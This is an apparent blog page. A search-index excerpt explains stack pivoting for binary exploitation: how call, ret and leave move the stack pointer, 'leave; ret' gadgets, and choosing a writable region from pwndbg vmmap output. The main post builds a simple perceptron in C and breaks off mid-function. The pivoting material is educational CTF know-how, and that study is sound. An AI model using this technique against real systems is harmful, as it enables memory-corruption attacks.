+<p>pop与push相反，用于弹栈，可以将rsp处的值弹出，他的流程大致为</p>
+<ol>
+<li>弹出rsp处的值</li>
+<li>rsp + 8
+需要注意pop事实上只移动了rsp，原本rsp处弹栈的数据并不会被清理</li>
+</ol>
+<h3 id="call">call</h3>
+<p>事实上call是一条隐式的push，当我们通过call调用某个地址时，实际做的是</p>
+<ol>
+<li>push rip</li>
+<li>jmp addr
+它会将call的下一条指令的地址压，并jmp到刚刚call的地址</li>
+</ol>
+<h3 id="ret">ret</h3>
+<p>和call相反，ret则是一条隐式的pop，当执行ret时</p>
+<ol>
+<li>pop rip</li>
+<li>jmp rip
+会将之前call压栈的返回地址pop到rip，并跳转</li>
+</ol>
+<h3 id="leave">leave</h3>
+<p>leave则是栈迁移的一条关键指令，主要作用是销毁栈
+执行的时候</p>
+<ol>
+<li>mov rsp, rbp</li>
+<li>pop rbp
+会将rsp移动到rbp处，并将当前位置的地址pop到rbp完成对rbp的移动</li>
+</ol>
+<h2 id="如何迁移">如何迁移</h2>
+<p>对于迁移栈，我们的目的是将栈移动到一个更加可控的位置，或利用有限的溢出大小实现更长的rop链，也可以通过多次栈迁移布置特定的数据结构栈风水等</p>
+<h3 id="gadget">gadget</h3>
+<p>对于gadget的选取，一般有两种选择</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">pop</span> rbp
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">retn</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">leave</span>
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">retn</span>
+</span></span></code></pre></div><p>这些gadget可以帮助我们控制rbp进而间接控制rsp</p>
+<h3 id="迁移目标位置的选择">迁移目标位置的选择</h3>
+<p>可以通过gdb调试寻找一些可读可写的区域</p>
+<pre tabindex="0"><code>pwndbg&amp;gt; vmmap
+legend: stack | heap | code | data | wx | rodata
+             start                end perm     size  offset file (set vmmap-prefer-relpaths on)
+          0x400000           0x401000 r--p     1000       0 pwn
+          0x401000           0x402000 r-xp     1000    1000 pwn
+          0x402000           0x403000 r--p     1000    2000 pwn
+          0x403000           0x404000 r--p     1000    2000 pwn
+          0x404000           0x405000 rw-p     1000    3000 pwn
+          0x405000           0x426000 rw-p    21000       0 [heap]
+    0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7c28000     0x7ffff7db0000 r-xp   188000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7db0000     0x7ffff7dff000 r--p    4f000  1b0000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7dff000     0x7ffff7e03000 r--p     4000  1fe000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7e03000     0x7ffff7e05000 rw-p     2000  202000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7e05000     0x7ffff7e12000 rw-p     d000       0 [anon_7ffff7e05]
+    0x7ffff7fae000     0x7ffff7fb1000 rw-p     3000       0 [anon_7ffff7fae]
+    0x7ffff7fbd000     0x7ffff7fbf000 rw-p     2000       0 [anon_7ffff7fbd]
+    0x7ffff7fbf000     0x7ffff7fc3000 r--p     4000       0 [vvar]
+    0x7ffff7fc3000     0x7ffff7fc5000 r-xp     2000       0 [vdso]
+    0x7ffff7fc5000     0x7ffff7fc6000 r--p     1000       0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffff7fc6000     0x7ffff7ff1000 r-xp    2b000    1000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000   2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000   36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000   38000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffffffde000     0x7ffffffff000 rw-p    21000       0 [stack]
+</code></pre><p>以这里为例，<code> 0x404000           0x405000 rw-p     1000    3000 pwn</code>就是一个很不错的选择</p>'><a href=/posts/%E6%A0%88%E8%BF%81%E7%A7%BB-pivoting/><span>栈迁移 - Pivoting</span><small>posts/</small></a></li><li class=search-empty hidden>No matching pages.</li></ul></dialog><dialog class="site-dialog shortcut-dialog" id=shortcut-dialog aria-labelledby=shortcut-title><form method=dialog class=dialog-header><h2 id=shortcut-title>Keyboard shortcuts</h2><button type=submit aria-label="Close shortcuts">×</button></form><dl><div><dt><kbd>Ctrl</kbd> + <kbd>K</kbd></dt><dd>Open search</dd></div><div><dt><kbd>Esc</kbd></dt><dd>Close menu or dialog</dd></div></dl></dialog><div class=workspace><aside class=explorer aria-label="Workspace explorer"><div class=panel-header><p class=panel-title>Explorer</p><button class=panel-collapse type=button data-view-toggle=explorer aria-label="Collapse Explorer" title="Collapse Explorer">‹</button></div><nav class=file-tree aria-label="Workspace files"><p class=workspace-root>⌄ workspace/</p><ul><li class=tree-directory><a class="tree-link is-current" href=/posts/><span aria-hidden=true>⌄</span>posts/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/posts/ret2dlresolve/><span aria-hidden=true>·</span>Ret2dlresolve</a></li><li><a class="tree-link tree-file" href=/posts/workspace-preview/><span aria-hidden=true>·</span>Workspace Preview</a></li><li><a class="tree-link tree-file is-current" href=/posts/%E4%B8%A4%E7%99%BE%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%90%93%E4%B8%80%E4%B8%AA%E5%8E%9F%E5%A7%8B%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/><span aria-hidden=true>·</span>两百行代码搓一个原始神经网络</a></li><li><a class="tree-link tree-file" href=/posts/%E6%A0%88%E8%BF%81%E7%A7%BB-pivoting/><span aria-hidden=true>·</span>栈迁移 - Pivoting</a></li></ul></li><li class=tree-directory><a class=tree-link href=/research/><span aria-hidden=true>⌄</span>research/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/research/perf%E4%B8%8E%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/><span aria-hidden=true>·</span>Perf与简单的侧信道攻击</a></li></ul></li><li class=tree-directory><a class=tree-link href=/projects/><span aria-hidden=true>⌄</span>projects/</a><ul class=tree-children></ul></li><li class=tree-directory><a class=tree-link href=/ctf/><span aria-hidden=true>⌄</span>ctf/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/ctf/geek-challenge-2025-wp/><span aria-hidden=true>·</span>Geek Challenge 2025 WP</a></li></ul></li><li class=tree-directory><a class=tree-link href=/about/><span aria-hidden=true>⌁</span>about/</a></li></ul></nav></aside><main class=main-content><div class=editor-pane><div class=article-layout><article class=article><header class=article-header><p class=path>posts\acient_neural_network\index.md</p><h1>两百行代码搓一个原始神经网络</h1><div class=article-meta><time datetime=2026-04-18>2026-04-18</time>
+<span>7 min read</span></div></header><details class="article-toc article-toc-mobile" data-article-toc><summary>Table of contents</summary><nav class=table-of-contents><ul><li><a href=#基本原理>基本原理</a></li><li><a href=#搓一个原始神经网络>搓一个原始神经网络</a><ul><li><a href=#基本处理>基本处理</a><ul><li><a href=#宏>宏</a></li><li><a href=#神经元输入>神经元输入</a></li><li><a href=#图像的保存与加载>图像的保存与加载</a></li><li><a href=#连接权重的加载>连接权重的加载</a></li><li><a href=#加权和计算>加权和计算</a></li><li><a href=#commonh>common.h</a></li></ul></li><li><a href=#预测模型>预测模型</a></li><li><a href=#训练模型>训练模型</a><ul><li><a href=#训练素材>训练素材</a></li><li><a href=#训练权重>训练权重</a></li></ul></li></ul></li><li><a href=#测试一下>测试一下</a><ul><li><a href=#demo1>demo1</a></li><li><a href=#demo2>demo2</a></li></ul></li></ul></nav></details><div class=article-body><p>这个文章主要还是因为这周研究了挺久的AI相关的东西，然后休闲时刷视频发现了这个</p><p><a href="https://www.bilibili.com/video/BV1zP4y1g7G5/?share_source=copy_web&amp;vd_source=853200eb173acad552081e78b7529b49">We&rsquo;re Building Computers Wrong</a></p><p>闲的没事尝试复现了一下其中的第一个demo，这也是是一个很简单但很有意思的demo
+如果你闲的蛋疼可以考虑看一下视频，就能大致知到原理了，当然你也可以考虑跳过，我在下面简述一下</p><p>另外完整的代码我已经放在 github 了，点一下我头像下面的连接就可以找到</p><h2 id=基本原理>基本原理</h2><p>如果你看了视频，这一步可以跳过</p><p>1958年，Frank Rosenblatt提出了一种模仿神经发射信号方式的机器 Mark I 感知机，Mark I 的输入层是一个 20x20 的感光单元矩阵，共400个光电探测器，用于"看"图像，并将光学信号转化为电信号，神经元之间连接的"权重"被编码在电位器中
+回到神经细胞(这里不是严格生物意义上的神经细胞)上，一个神经细胞可以有两种激活状态，激活或者不激活，而神经细胞之间可以有连接，如果一个神经细胞连接数个神经细胞，这个细胞的激活状态由其他神经细胞决定，这些神经细胞的激活与不激活的状态通过连接传递给这个神经细胞，不同的神经细胞之间的连接强度不同，部分连接可以起到刺激作用，部分为抑制作用，当整合后的信号超过某个阈值，这个神经细胞就会激活</p><p>我们可以把这里的连接强度视作一种权重，不同神经细胞的输入乘以对应的权重的和是否能够达到某个阈值决定下一个神经细胞的状态，因此我们可以很简单的模拟出神经细胞的运作方式，复现一下 Mark I 感知机
+有可能你看的一头雾水，直接上实战演示</p><h2 id=搓一个原始神经网络>搓一个原始神经网络</h2><p>这里的原理并不是特别复杂，因此你甚至可以使用c语言搓一个出来，所以我们就直接掏出巨大的c语言，直接做一个简单的demo使得可以分辨方形和圆形</p><h3 id=基本处理>基本处理</h3><p>为了方便接下来的代码编写，我们先搓一个common.h文件</p><h4 id=宏>宏</h4><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#ifndef COMMON_H
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define COMMON_H
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;stdlib.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;string.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define WIDTH  20         </span><span style=color:#8b949e;font-style:italic>// 图形宽度
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#8b949e;font-weight:700;font-style:italic>#define HEIGHT 20         </span><span style=color:#8b949e;font-style:italic>// 图形高度
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#8b949e;font-weight:700;font-style:italic>#define BIAS   20.0f      </span><span style=color:#8b949e;font-style:italic>// 分类阈值
+</span></span></span></code></pre></div><h4 id=神经元输入>神经元输入</h4><p>首先我们需要一个 <code>20*20</code> 的"感光单元矩阵"，当然我们使用一个 <code>20*20</code> char数组就行了,数组的每个索引处可以是一个数，这里我们为了方便，只采用0和1，这<code>20*20</code>的每个神经元的权重我们同样采用一个数组保存，但是这个没办法缩减，使用一个float数组</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff7b72>typedef</span> <span style=color:#ff7b72>unsigned</span> <span style=color:#ff7b72>char</span> Image[HEIGHT][WIDTH];
+</span></span><span style=display:flex><span><span style=color:#ff7b72>typedef</span> <span style=color:#ff7b72>float</span> Weights[HEIGHT][WIDTH];
+</span></span></code></pre></div><h4 id=图像的保存与加载>图像的保存与加载</h4><p>这里为了简单方便的表示，我们就不使用.png .jpg之类的复杂的图片，我们使用一个.bin文件，每个字节代表一个像素，每个图片20*20=400个字节</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff7b72>static</span> <span style=color:#ff7b72>inline</span> <span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>load_image</span>(<span style=color:#ff7b72>const</span> <span style=color:#ff7b72>char</span> <span style=color:#ff7b72;font-weight:700>*</span>filepath, Image img) {
+</span></span><span style=display:flex><span>    FILE <span style=color:#ff7b72;font-weight:700>*</span>f <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>fopen</span>(filepath, <span style=color:#a5d6ff>&#34;rb&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (<span style=color:#ff7b72;font-weight:700>!</span>f) <span style=color:#ff7b72>return</span> <span style=color:#ff7b72;font-weight:700>-</span><span style=color:#a5d6ff>1</span>;
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>size_t</span> n <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>fread</span>(img, <span style=color:#ff7b72>sizeof</span>(<span style=color:#ff7b72>unsigned</span> <span style=color:#ff7b72>char</span>), HEIGHT <span style=color:#ff7b72;font-weight:700>*</span> WIDTH, f);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>fclose</span>(f);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> (n <span style=color:#ff7b72;font-weight:700>==</span> HEIGHT <span style=color:#ff7b72;font-weight:700>*</span> WIDTH) <span style=color:#ff7b72;font-weight:700>?</span> <span style=color:#a5d6ff>0</span> <span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#ff7b72;font-weight:700>-</span><span style=color:#a5d6ff>1</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>static</span> <span style=color:#ff7b72>inline</span> <span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>save_weights</span>(<span style=color:#ff7b72>const</span> Weights w, <span style=color:#ff7b72>const</span> <span style=color:#ff7b72>char</span> <span style=color:#ff7b72;font-weight:700>*</span>path) {
+</span></span><span style=display:flex><span>    FILE <span style=color:#ff7b72;font-weight:700>*</span>f <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>fopen</span>(path, <span style=color:#a5d6ff>&#34;wb&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (<span style=color:#ff7b72;font-weight:700>!</span>f) {
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>fprintf</span>(stderr, <span style=color:#a5d6ff>&#34;ERROR: cannot write weights to %s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, path);
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>exit</span>(<span style=color:#a5d6ff>1</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>fwrite</span>(w, <span style=color:#ff7b72>sizeof</span>(<span style=color:#ff7b72>float</span>), HEIGHT <span style=color:#ff7b72;font-weight:700>*</span> WIDTH, f);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>fclose</span>(f);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h4 id=连接权重的加载>连接权重的加载</h4><p>同样，我们可以给将权重保存到.bin文件，并从此加载</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff7b72>static</span> <span style=color:#ff7b72>inline</span> <span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>load_weights</span>(Weights w, <span style=color:#ff7b72>const</span> <span style=color:#ff7b72>char</span> <span style=color:#ff7b72;font-weight:700>*</span>path) {
+</span></span><span style=display:flex><span>    FILE <span style=color:#ff7b72;font-weight:700>*</span>f <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>fopen</span>(path, <span style=color:#a5d6ff>&#34;rb&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (<span style=color:#ff7b72;font-weight:700>!</span>f) {
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>fprintf</span>(stderr, <span style=color:#a5d6ff>&#34;ERROR: cannot load weights from %s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, path);
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>exit</span>(<span style=color:#a5d6ff>1</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>fread</span>(w, <span style=color:#ff7b72>sizeof</span>(<span style=color:#ff7b72>float</span>), HEIGHT <span style=color:#ff7b72;font-weight:700>*</span> WIDTH, f);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>fclose</span>(f);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h4 id=加权和计算>加权和计算</h4><p>我们可以直接将每个索引与其对应的权重相乘并计算其和</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff7b72>static</span> <span style=color:#ff7b72>inline</span> <span style=color:#ff7b72>float</span> <span style=color:#d2a8ff;font-weight:700>feed_forward</span>(<span style=color:#ff7b72>const</span> Image img, <span style=color:#ff7b72>const</span> Weights w) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>float</span> sum <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0.0f</span>;
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> y <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; y <span style=color:#ff7b72;font-weight:700>&lt;</span> HEIGHT; <span style=color:#ff7b72;font-weight:700>++</span>y)
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> x <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; x <span style=color:#ff7b72;font-weight:700>&lt;</span> WIDTH; <span style=color:#ff7b72;font-weight:700>++</span>x)
+</span></span><span style=display:flex><span>            sum <span style=color:#ff7b72;font-weight:700>+=</span> img[y][x] <span style=color:#ff7b72;font-weight:700>*</span> w[y][x];
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> sum;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h4 id=commonh>common.h</h4><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#ifndef COMMON_H
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define COMMON_H
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;stdlib.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;string.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define WIDTH  20
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define HEIGHT 20
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define BIAS   20.0f      </span><span style=color:#8b949e;font-style:italic>// 分类阈值
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic>// 图像数据类型（每个像素 0 或 1）
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#ff7b72>typedef</span> <span style=color:#ff7b72>unsigned</span> <span style=color:#ff7b72>char</span> Image[HEIGHT][WIDTH];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic>// 权重数据类型（浮点数）
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#ff7b72>typedef</span> <span style=color:#ff7b72>float</span> Weights[HEIGHT][WIDTH];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic>// 读取 .bin 图像文件
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#ff7b72>static</span> <span style=color:#ff7b72>inline</span> <span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>load_image</span>(<span style=color:#ff7b72>const</span> <span style=color:#ff7b72>char</span> <span style=color:#ff7b72;font-weight:700>*</span>filepath, Image img) {
+</span></span><span style=display:flex><span>    FILE <span style=color:#ff7b72;font-weight:700>*</span>f <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>fopen</span>(filepath, <span style=color:#a5d6ff>&#34;rb&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (<span style=color:#ff7b72;font-weight:700>!</span>f) <span style=color:#ff7b72>return</span> <span style=color:#ff7b72;font-weight:700>-</span><span style=color:#a5d6ff>1</span>;
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>size_t</span> n <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>fread</span>(img, <span style=color:#ff7b72>sizeof</span>(<span style=color:#ff7b72>unsigned</span> <span style=color:#ff7b72>char</span>), HEIGHT <span style=color:#ff7b72;font-weight:700>*</span> WIDTH, f);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>fclose</span>(f);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> (n <span style=color:#ff7b72;font-weight:700>==</span> HEIGHT <span style=color:#ff7b72;font-weight:700>*</span> WIDTH) <span style=color:#ff7b72;font-weight:700>?</span> <span style=color:#a5d6ff>0</span> <span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#ff7b72;font-weight:700>-</span><span style=color:#a5d6ff>1</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic>// 保存权重到二进制文件
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#ff7b72>static</span> <span style=color:#ff7b72>inline</span> <span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>save_weights</span>(<span style=color:#ff7b72>const</span> Weights w, <span style=color:#ff7b72>const</span> <span style=color:#ff7b72>char</span> <span style=color:#ff7b72;font-weight:700>*</span>path) {
+</span></span><span style=display:flex><span>    FILE <span style=color:#ff7b72;font-weight:700>*</span>f <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>fopen</span>(path, <span style=color:#a5d6ff>&#34;wb&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (<span style=color:#ff7b72;font-weight:700>!</span>f) {
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>fprintf</span>(stderr, <span style=color:#a5d6ff>&#34;ERROR: cannot write weights to %s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, path);
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>exit</span>(<span style=color:#a5d6ff>1</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>fwrite</span>(w, <span style=color:#ff7b72>sizeof</span>(<span style=color:#ff7b72>float</span>), HEIGHT <span style=color:#ff7b72;font-weight:700>*</span> WIDTH, f);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>fclose</span>(f);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic>// 加载权重文件
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#ff7b72>static</span> <span style=color:#ff7b72>inline</span> <span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>load_weights</span>(Weights w, <span style=color:#ff7b72>const</span> <span style=color:#ff7b72>char</span> <span style=color:#ff7b72;font-weight:700>*</span>path) {
+</span></span><span style=display:flex><span>    FILE <span style=color:#ff7b72;font-weight:700>*</span>f <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>fopen</span>(path, <span style=color:#a5d6ff>&#34;rb&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (<span style=color:#ff7b72;font-weight:700>!</span>f) {
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>fprintf</span>(stderr, <span style=color:#a5d6ff>&#34;ERROR: cannot load weights from %s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, path);
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>exit</span>(<span style=color:#a5d6ff>1</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>fread</span>(w, <span style=color:#ff7b72>sizeof</span>(<span style=color:#ff7b72>float</span>), HEIGHT <span style=color:#ff7b72;font-weight:700>*</span> WIDTH, f);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>fclose</span>(f);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic>// 前向传播：计算加权和
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#ff7b72>static</span> <span style=color:#ff7b72>inline</span> <span style=color:#ff7b72>float</span> <span style=color:#d2a8ff;font-weight:700>feed_forward</span>(<span style=color:#ff7b72>const</span> Image img, <span style=color:#ff7b72>const</span> Weights w) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>float</span> sum <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0.0f</span>;
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> y <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; y <span style=color:#ff7b72;font-weight:700>&lt;</span> HEIGHT; <span style=color:#ff7b72;font-weight:700>++</span>y)
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> x <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; x <span style=color:#ff7b72;font-weight:700>&lt;</span> WIDTH; <span style=color:#ff7b72;font-weight:700>++</span>x)
+</span></span><span style=display:flex><span>            sum <span style=color:#ff7b72;font-weight:700>+=</span> img[y][x] <span style=color:#ff7b72;font-weight:700>*</span> w[y][x];
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> sum;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic>// 更新规则：权重 += 输入（用于圆形误判为矩形时）
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#ff7b72>static</span> <span style=color:#ff7b72>inline</span> <span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>add_input</span>(Weights w, <span style=color:#ff7b72>const</span> Image img) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> y <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; y <span style=color:#ff7b72;font-weight:700>&lt;</span> HEIGHT; <span style=color:#ff7b72;font-weight:700>++</span>y)
